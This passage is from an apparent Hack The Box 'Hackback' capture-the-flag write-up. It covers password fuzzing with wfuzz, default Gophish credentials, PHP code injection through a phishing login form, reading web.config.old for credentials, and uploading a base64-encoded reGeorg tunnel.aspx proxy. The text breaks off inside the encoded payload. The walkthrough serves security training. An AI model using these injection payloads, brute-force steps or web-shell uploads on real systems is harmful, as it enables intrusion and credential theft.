class="line">*****</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;admin.hackback.htb&#x2F;2bb6916122f1da34dcd916421e531578&#x2F;webadmin.php?action&#x3D;list&amp;site&#x3D;hackthebox&amp;password&#x3D;FUZZ&amp;session&#x3D;</span><br><span class="line">Total requests: 10000</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID   Response   Lines      Word         Chars          Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000001:  C&#x3D;302      0 L        3 W           17 Ch        &quot;123456&quot;</span><br><span class="line">000004:  C&#x3D;302      0 L        3 W           17 Ch        &quot;password&quot;</span><br><span class="line">000006:  C&#x3D;302      0 L        3 W           17 Ch        &quot;abc123&quot;</span><br><span class="line">000005:  C&#x3D;302      0 L        3 W           17 Ch        &quot;qwerty&quot;</span><br><span class="line">000007:  C&#x3D;302      7 L       15 W          197 Ch        &quot;12345678&quot;</span><br><span class="line">000008:  C&#x3D;302      0 L        3 W           17 Ch        &quot;password1&quot;</span><br><span class="line">000009:  C&#x3D;302      0 L        3 W           17 Ch        &quot;1234567&quot;</span><br><span class="line">000010:  C&#x3D;302      0 L        3 W           17 Ch        &quot;123123&quot;</span><br><span class="line">000002:  C&#x3D;302      0 L        3 W           17 Ch        &quot;123456789&quot;</span><br><span class="line">000003:  C&#x3D;302      0 L        3 W           17 Ch        &quot;111111&quot;</span><br><span class="line">000011:  C&#x3D;302      0 L        3 W           17 Ch        &quot;1234567890&quot;</span><br><span class="line">000012:  C&#x3D;302      0 L        3 W           17 Ch        &quot;000000&quot;</span><br><span class="line">000013:  C&#x3D;302      0 L        3 W           17 Ch        &quot;12345&quot;</span><br><span class="line">^C</span><br><span class="line">Finishing pending requests...</span><br></pre></td></tr></table></figure>
<p><code>12345678</code> gave a different response length so it’s probably the password :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/hackback<span class="comment"># curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=12345678&amp;session='</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">7</span>cb114055494cb503306a0edd1ad1d398f6fb18e28a7a62883c24fd8ab34f66b.log</span><br><span class="line">    [<span class="number">3</span>] =&gt; e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>Yes it worked. I added my <code>PHPSESSID</code> cookie with the <code>-b</code> option and I also added it to <code>&amp;session=</code>, because some stuff didn’t work without including the session cookie.<br><code>list</code> showed us some logs. I tried the other actions, <code>exec</code> said <code>Missing command</code> but I couldn’t make it execute anything. <code>init</code> didn’t output anything but most likely it’s doing something that doesn’t produce an output. Also <code>show</code> didn’t result in any output but we will make it do soon.</p>
<h2 id="Gophish"><a href="#Gophish" class="headerlink" title="Gophish"></a>Gophish</h2><p>Let’s take a look at the full <code>nmap</code> scan :<br><code>nmap -T5 -p- hackback.htb --max-retries 1</code><br><img src="/images/hackthebox/hackback/10.png" alt=""><br>There’s another 3rd port : <code>64831</code>. I scanned that port with <code>nmap</code> :<br><code>nmap -sV -sT -sC -p 64831 hackback.htb</code><br><img src="/images/hackthebox/hackback/11.png" alt=""><br>It’s <code>https</code>. I went there and it was <code>gophish</code> :<br><img src="/images/hackthebox/hackback/12.png" alt=""></p>
<blockquote>
<p>Gophish is a powerful, open-source phishing framework that makes it easy to test your organization’s exposure to phishing. -<a href="https://getgophish.com/" target="_blank" rel="noopener">getgophish.com</a></p>
</blockquote>
<p>I tried to login with the default credentials : <code>admin : gophish</code> and it worked :<br><img src="/images/hackthebox/hackback/13.png" alt=""><br>It was kinda empty but I found some email templates for Facebook, HackTheBox, PayPal and Twitter.<br><img src="/images/hackthebox/hackback/14.png" alt=""><br>So there are phishing sites somewhere for these sites and now we can understand what’s happening in the secret path. It’s an endpoint that shows the collected data from the phishing sites. I created a small list to search for HackTheBox phishing site :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hackthebox</span><br><span class="line">hacktheboxeu</span><br><span class="line">hackthebox.eu</span><br><span class="line">htb</span><br><span class="line">www.hackthebox</span><br><span class="line">www.hacktheboxeu</span><br><span class="line">www.hackthebox.eu</span><br><span class="line">www.htb</span><br></pre></td></tr></table></figure>
<p>Then I used <code>wfuzz</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# wfuzz -c -w list.txt -H &quot;HOST: FUZZ.htb&quot; http:&#x2F;&#x2F;10.10.10.128</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line">* Wfuzz 2.3.4 - The Web Fuzzer                         *</span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.128&#x2F;</span><br><span class="line">Total requests: 9</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID   Response   Lines      Word         Chars          Payload    </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000001:  C&#x3D;200     33 L       54 W          614 Ch        &quot;hackthebox&quot;</span><br><span class="line">000005:  C&#x3D;200    102 L      345 W         4110 Ch        &quot;www.hackthebox&quot;</span><br><span class="line">000008:  C&#x3D;200     33 L       54 W          614 Ch        &quot;www.htb&quot;</span><br><span class="line">000009:  C&#x3D;400      6 L       26 W          334 Ch        &quot;&quot;</span><br><span class="line">000006:  C&#x3D;200     33 L       54 W          614 Ch        &quot;www.hacktheboxeu&quot;</span><br><span class="line">000007:  C&#x3D;200     33 L       54 W          614 Ch        &quot;www.hackthebox.eu&quot;</span><br><span class="line">000002:  C&#x3D;200     33 L       54 W          614 Ch        &quot;hacktheboxeu&quot;</span><br><span class="line">000003:  C&#x3D;200     33 L       54 W          614 Ch        &quot;hackthebox.eu&quot;</span><br><span class="line">000004:  C&#x3D;200     33 L       54 W          614 Ch        &quot;htb&quot;</span><br><span class="line"></span><br><span class="line">Total time: 0.492524</span><br><span class="line">Processed Requests: 9</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests&#x2F;sec.: 18.27319</span><br></pre></td></tr></table></figure>
<p><code>www.hackthebox</code> gave a different response length so it’s the right one. I added it to <code>/etc/hosts</code> :<br><img src="/images/hackthebox/hackback/15.png" alt=""><br><code>http://www.hackthebox.htb</code> :<br><img src="/images/hackthebox/hackback/16.png" alt=""><br>Just a fake Hack The Box login page. I entered test credentials :<br><img src="/images/hackthebox/hackback/17.png" alt=""><br>Then I checked the secret path again and did <code>list</code> :<br><img src="/images/hackthebox/hackback/18.png" alt=""><br>The logs increased by one. I did <code>show</code> and found the credentials I just sent :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# curl -b &quot;PHPSESSID&#x3D;33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; &#39;http:&#x2F;&#x2F;admin.hackback.htb&#x2F;2bb6916122f1da34dcd916421e531578&#x2F;webadmin.php?action&#x3D;show&amp;site&#x3D;hackthebox&amp;password&#x3D;12345678&amp;session&#x3D;33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&#39;                                                                                                        </span><br><span class="line">[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test</span><br></pre></td></tr></table></figure>


<h2 id="PHP-Code-Injection-Uploading-Tunnel"><a href="#PHP-Code-Injection-Uploading-Tunnel" class="headerlink" title="PHP Code Injection, Uploading Tunnel"></a>PHP Code Injection, Uploading Tunnel</h2><p>With a functionality like this, there might be some injection somewhere. After some attempts I tried <code>php</code> code and it was executed :<br><img src="/images/hackthebox/hackback/19.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# curl -b &quot;PHPSESSID&#x3D;33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&quot; &#39;http:&#x2F;&#x2F;admin.hackback.htb&#x2F;2bb6916122f1da34dcd916421e531578&#x2F;webadmin.php?action&#x3D;show&amp;site&#x3D;hackthebox&amp;password&#x3D;12345678&amp;session&#x3D;33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739&#39;</span><br><span class="line">[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test</span><br><span class="line">[05 July 2019, 05:00:20 PM] 10.10.xx.xx - Username: , Password: whatever</span><br></pre></td></tr></table></figure>
<p>The <code>username</code> is empty instead of printing the text I have sent, which means that it got executed as <code>php</code>. However all the functions we would use to get <code>RCE</code> like <code>exec</code> and <code>system</code> are disabled so … no we won’t have a shell now.<br>I wanted to list the files in the current directory so I used the <code>scandir()</code> function :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r(scandir(<span class="string">'.'</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hackback/20.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/hackback<span class="comment"># curl -b "PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'</span></span><br><span class="line">[<span class="number">05</span> July <span class="number">2019</span>, <span class="number">05</span>:<span class="number">06</span>:<span class="number">37</span> PM] <span class="number">10.10</span>.xx.xx - Username: <span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; index.html</span><br><span class="line">    [<span class="number">3</span>] =&gt; webadmin.php</span><br><span class="line">)</span><br><span class="line">, Password: whatever</span><br></pre></td></tr></table></figure>
<p>I went up one directory :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r(scandir(<span class="string">'..'</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/hackback/21.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>] =&gt; .</span><br><span class="line">[<span class="number">1</span>] =&gt; ..</span><br><span class="line">[<span class="number">2</span>] =&gt; <span class="number">2</span>bb6916122f1da34dcd916421e531578</span><br><span class="line">[<span class="number">3</span>] =&gt; App_Data</span><br><span class="line">[<span class="number">4</span>] =&gt; aspnet_client</span><br><span class="line">[<span class="number">5</span>] =&gt; css</span><br><span class="line">[<span class="number">6</span>] =&gt; img</span><br><span class="line">[<span class="number">7</span>] =&gt; index.php</span><br><span class="line">[<span class="number">8</span>] =&gt; js</span><br><span class="line">[<span class="number">9</span>] =&gt; logs</span><br><span class="line">[<span class="number">10</span>] =&gt; web.config</span><br><span class="line">[<span class="number">11</span>] =&gt; web.config.old</span><br></pre></td></tr></table></figure>
<p><code>web.config</code> and <code>web.config.old</code> look interesting. I checked them and in <code>web.config.old</code> I found some credentials. I used the <code>file_get_contents()</code> function :<br><code>&lt;?php echo file_get_contents(&#39;../web.config.old&#39;); ?&gt;</code><br><img src="/images/hackthebox/hackback/22.png" alt=""><br><code>web.config.old</code> :</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">authentication</span> <span class="attr">mode</span>=<span class="string">"Windows"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">identity</span> <span class="attr">impersonate</span>=<span class="string">"true"</span>                 </span></span><br><span class="line"><span class="tag">            <span class="attr">userName</span>=<span class="string">"simple"</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">password</span>=<span class="string">"ZonoProprioZomaro:-("</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">authentication</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directoryBrowse</span> <span class="attr">enabled</span>=<span class="string">"false"</span> <span class="attr">showFlags</span>=<span class="string">"None"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Credentials : <code>simple : ZonoProprioZomaro:-(</code>. However there’s no place to use these credentials. I went back to the <code>http</code> port 6666 and I executed <code>netstat</code>. I found that <code>winrm</code> was running internally :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">"CimInstanceProperties":  [</span><br><span class="line">                              "Caption",</span><br><span class="line">                              "Description",</span><br><span class="line">                              "ElementName",</span><br><span class="line">                              "InstanceID = \"::1??49852??::1??5985\"",</span><br><span class="line">                              "CommunicationStatus",</span><br><span class="line">                              "DetailedStatus",</span><br><span class="line">                              "HealthState",</span><br><span class="line">                              "InstallDate",</span><br><span class="line">                              "Name",</span><br><span class="line">                              "OperatingStatus",</span><br><span class="line">                              "OperationalStatus",</span><br><span class="line">                              "PrimaryStatus",</span><br><span class="line">                              "Status",</span><br><span class="line">                              "StatusDescriptions",</span><br><span class="line">                              "AvailableRequestedStates",</span><br><span class="line">                              "EnabledDefault = 2",</span><br><span class="line">                              "EnabledState",</span><br><span class="line">                              "OtherEnabledState",</span><br><span class="line">                              "RequestedState = 5",</span><br><span class="line">                              "TimeOfLastStateChange",</span><br><span class="line">                              "TransitioningToState = 12",</span><br><span class="line">                              "AggregationBehavior",</span><br><span class="line">                              "Directionality",</span><br><span class="line">                              "CreationTime = 12/31/1600 4:00:00 PM",</span><br><span class="line">                              "LocalAddress = \"::1\"",</span><br><span class="line">                              "LocalPort = 49852",</span><br><span class="line">                              "OwningProcess = 0",</span><br><span class="line">                              "AppliedSetting = 6",</span><br><span class="line">                              "OffloadState = 0",</span><br><span class="line">                              "RemoteAddress = \"::1\"",</span><br><span class="line">                              "RemotePort = 5985",</span><br><span class="line">                              <span class="string">"State = 11"</span></span><br><span class="line">                          ],</span><br></pre></td></tr></table></figure>
<p>So somehow we need a proxy to run internally and make us able to connect to <code>winrm</code>. Luckily there’s <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener"><code>reGeorgSocksProxy</code></a>.<br>I downloaded <code>tunnel.aspx</code>, converted it to <code>base-64</code> then I uploaded it using <code>file_put_contents()</code> and <code>base64_decode()</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"tunnel.aspx"</span>,base64_decode(<span class="string">"PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWy